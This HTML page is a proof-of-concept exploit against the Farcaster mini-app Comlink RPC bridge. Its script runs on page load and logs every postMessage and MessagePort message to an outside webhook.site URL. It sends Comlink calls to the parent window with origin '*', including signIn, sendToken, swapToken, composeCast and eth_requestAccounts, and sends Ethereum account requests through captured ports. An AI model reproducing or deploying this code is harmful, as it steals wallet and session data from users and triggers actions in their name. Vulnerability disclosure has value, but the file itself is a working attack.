<!doctype html>
<html>
	<head>
		<meta charset="utf-8" />
		<meta name="viewport" content="width=device-width, initial-scale=1" />
		<title>Security PoC</title>
		<style>
			* {
				margin: 0;
				padding: 0;
				box-sizing: border-box;
			}
			body {
				font-family: -apple-system, sans-serif;
				background: #17101f;
				color: #fff;
				padding: 16px;
				font-size: 12px;
			}
			.banner {
				background: #dc2626;
				padding: 10px;
				border-radius: 8px;
				margin-bottom: 12px;
				font-weight: bold;
				text-align: center;
			}
			.card {
				background: #1e1529;
				border: 1px solid #2a2035;
				border-radius: 8px;
				padding: 10px;
				margin-bottom: 10px;
			}
			.card h3 {
				color: #a855f7;
				margin-bottom: 4px;
				font-size: 12px;
			}
			.card pre {
				color: #ccc;
				font-size: 10px;
				word-break: break-all;
				white-space: pre-wrap;
				background: #0d0912;
				padding: 6px;
				border-radius: 4px;
				margin-top: 4px;
				max-height: 250px;
				overflow-y: auto;
			}
			.pass {
				color: #4ade80;
			}
			.fail {
				color: #f87171;
			}
		</style>
	</head>
	<body>
		<div class="banner">⚠️ Farcaster Comlink RPC Exploit PoC</div>

		<div class="card">
			<h3>📨 Messages Received</h3>
			<pre id="msg-log">Waiting...</pre>
		</div>

		<div class="card">
			<h3>🔌 Port Transfers</h3>
			<pre id="port-log">Waiting...</pre>
		</div>

		<div class="card">
			<h3>🔑 Wallet/SDK Responses</h3>
			<pre id="wallet-log">Waiting for responses...</pre>
		</div>

		<div class="card">
			<h3>📡 Exfiltration</h3>
			<pre id="exfil-log">Ready...</pre>
		</div>

		<script>
			var WEBHOOK = "https://webhook.site/a9641ead-2421-404a-83bd-6be9ad1c4e60";
			var msgLog = [];
			var portLog = [];
			var walletLog = [];
			var exfilLog = [];
			var msgCounter = 1000;

			function updateUI() {
				document.getElementById("msg-log").textContent = msgLog.length > 0 ? JSON.stringify(msgLog.slice(-20), null, 2) : "No messages...";
				document.getElementById("port-log").textContent = portLog.length > 0 ? JSON.stringify(portLog, null, 2) : "No ports...";
				document.getElementById("wallet-log").textContent = walletLog.length > 0 ? JSON.stringify(walletLog, null, 2) : "No responses...";
				document.getElementById("exfil-log").textContent = exfilLog.slice(-10).join("\n");
			}

			function sendToWebhook(label, data) {
				try {
					fetch(WEBHOOK, {
						method: "POST",
						mode: "no-cors",
						headers: { "Content-Type": "text/plain" },
						body: JSON.stringify({ label: label, data: data, ts: new Date().toISOString() }),
					});
					exfilLog.push(new Date().toISOString().substring(11, 19) + " " + label);
					updateUI();
				} catch (e) {}
			}

			// =============================================
			// Comlink message types
			// These match the comlink library's internal protocol
			// =============================================
			var COMLINK_GET = "GET";
			var COMLINK_SET = "SET";
			var COMLINK_APPLY = "APPLY";
			var COMLINK_CONSTRUCT = "CONSTRUCT";
			var COMLINK_ENDPOINT = "ENDPOINT";
			var COMLINK_RELEASE = "RELEASE";

			// =============================================
			// Listen for ALL messages including comlink
			// =============================================
			window.addEventListener("message", function (event) {
				var entry = {
					origin: event.origin,
					data: JSON.stringify(event.data).substring(0, 500),
					hasPorts: !!(event.ports && event.ports.length),
					portCount: event.ports ? event.ports.length : 0,
					ts: new Date().toISOString(),
				};
				msgLog.push(entry);
				sendToWebhook("msg", entry);

				// Check for comlink responses
				if (event.data && (event.data.id !== undefined || event.data.type)) {
					walletLog.push({
						type: "comlink_response",
						data: JSON.stringify(event.data).substring(0, 500),
						origin: event.origin,
						ts: new Date().toISOString(),
					});
					sendToWebhook("COMLINK_RESPONSE", event.data);
				}

				// Check for frameEvent messages from Farcaster
				if (event.data && event.data.type === "frameEvent") {
					walletLog.push({
						type: "FRAME_EVENT",
						event: event.data.event,
						ts: new Date().toISOString(),
					});
					sendToWebhook("FRAME_EVENT_RECEIVED", event.data);
				}

				// Check for ethProvider events
				if (event.data && event.data.type === "frameEthProviderEvent") {
					walletLog.push({
						type: "ETH_PROVIDER_EVENT",
						event: event.data.event,
						params: event.data.params,
						ts: new Date().toISOString(),
					});
					sendToWebhook("ETH_PROVIDER_EVENT", event.data);
				}

				// Handle port transfers
				if (event.ports && event.ports.length > 0) {
					portLog.push({
						count: event.ports.length,
						origin: event.origin,
						data: JSON.stringify(event.data).substring(0, 200),
						ts: new Date().toISOString(),
					});
					sendToWebhook("PORTS_RECEIVED", { count: event.ports.length, data: event.data });

					event.ports.forEach(function (port, i) {
						port.onmessage = function (pe) {
							walletLog.push({
								type: "PORT_MSG",
								portIndex: i,
								data: JSON.stringify(pe.data).substring(0, 500),
								ts: new Date().toISOString(),
							});
							sendToWebhook("PORT_MESSAGE", { portIndex: i, data: pe.data });
							updateUI();
						};
						port.start();

						// Send comlink-formatted requests through the port
						try {
							port.postMessage({ id: msgCounter++, type: COMLINK_APPLY, path: ["ethProviderRequestV2"], argumentList: [{ method: "eth_accounts", params: [] }] });
							port.postMessage({ id: msgCounter++, type: COMLINK_APPLY, path: ["ethProviderRequestV2"], argumentList: [{ method: "eth_chainId", params: [] }] });
							port.postMessage({ id: msgCounter++, type: COMLINK_APPLY, path: ["ethProviderRequestV2"], argumentList: [{ method: "eth_requestAccounts", params: [] }] });
							sendToWebhook("PORT_REQUESTS_SENT", { portIndex: i });
						} catch (e) {
							sendToWebhook("PORT_REQUEST_ERROR", { error: e.message });
						}
					});
				}

				updateUI();
			});

			// =============================================
			// Send comlink-formatted RPC calls to parent
			// The expose function listens on globalThis (window)
			// with origin allowlist ["*"]
			// =============================================

			function sendComlinkCall(method, args) {
				var id = msgCounter++;
				var msg = {
					id: id,
					type: COMLINK_APPLY,
					path: [method],
					argumentList: args || [],
				};
				window.parent.postMessage(msg, "*");
				sendToWebhook("comlink_call_sent", { method: method, id: id });
				return id;
			}

			// Try calling SDK methods via comlink
			setTimeout(function () {
				// These are the wrapHandlers(sdk) methods
				sendComlinkCall("ready", []);
				sendComlinkCall("close", []);
				sendComlinkCall("openUrl", ["https://example.com"]);
				sendComlinkCall("setPrimaryButton", [{ text: "HACKED" }]);
				sendComlinkCall("signIn", [{ nonce: "test123" }]);
				sendComlinkCall("viewProfile", [{ fid: 1 }]);
				sendComlinkCall("composeCast", [{ text: "test" }]);
				sendComlinkCall("sendToken", [{}]);
				sendComlinkCall("swapToken", [{}]);
				sendComlinkCall("addMiniApp", [{}]);

				// Try direct eth provider
				sendComlinkCall("ethProviderRequestV2", [{ method: "eth_accounts", params: [] }]);
				sendComlinkCall("ethProviderRequestV2", [{ method: "eth_chainId", params: [] }]);
				sendComlinkCall("ethProviderRequestV2", [{ method: "eth_requestAccounts", params: [] }]);
			}, 1000);

			// Try again after 3 seconds in case of delayed init
			setTimeout(function () {
				sendComlinkCall("ready", []);
				sendComlinkCall("ethProviderRequestV2", [{ method: "eth_accounts", params: [] }]);
				sendComlinkCall("signIn", [{ nonce: "test456" }]);
			}, 3000);

			// Status checks
			var checkCount = 0;
			var checker = setInterval(function () {
				checkCount++;
				if (checkCount > 15) {
					clearInterval(checker);
					return;
				}
				sendToWebhook("status", {
					second: checkCount * 2,
					messages: msgLog.length,
					ports: portLog.length,
					walletResponses: walletLog.length,
				});
			}, 2000);

			sendToWebhook("poc_started", {
				location: window.location.href,
				referrer: document.referrer,
				isFramed: window.self !== window.top,
			});
		</script>
	</body>
</html>
